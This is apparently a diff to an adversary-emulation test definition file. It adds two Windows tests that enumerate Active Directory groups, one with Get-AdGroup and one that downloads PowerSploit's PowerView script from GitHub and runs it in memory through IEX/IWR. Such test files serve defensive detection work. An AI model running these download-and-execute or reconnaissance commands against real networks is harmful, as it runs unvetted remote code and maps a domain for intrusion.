@@ -133,3 +133,25 @@ atomic_tests:
     command: |
       #{adfind_path} -f (objectcategory=group)
     name: command_prompt
+- name: Enumerate Active Directory Groups with Get-AdGroup
+  description: |
+    The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
+    Upon successful execution a listing of groups will output with their paths in AD.
+    Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Get-AdGroup -Filter *
+- name: Get-DomainGroup with PowerView
+  description: |
+    Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
+    name: powershell
